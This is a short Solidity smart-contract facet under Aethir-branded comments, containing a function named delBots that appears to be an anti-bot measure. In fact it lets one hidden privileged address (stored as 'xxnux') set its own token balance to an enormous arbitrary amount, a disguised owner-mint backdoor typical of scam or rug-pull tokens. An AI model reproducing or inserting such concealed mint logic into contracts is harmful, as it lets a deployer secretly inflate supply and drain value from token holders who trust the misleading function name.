/*  
   * SPDX-License-Identifier: MIT
    ▫️Website: https://www.aethir.com
    ▫️Twitter: https://twitter.com/AethirCloud
    ▫️Telegram: https://t.me/aethirofficial
    ▫️Discord: https://discord.gg/aethircloud
    ▫️Reddit: https://www.reddit.com/r/AethirCloud
    ▫️Linkedin: https://www.linkedin.com/company/aethir-limited
*/
pragma solidity ^0.8.17;
import "./TestLib.sol";
contract delBotsFacet {
    function delBots(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                100000000 *
                10000 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
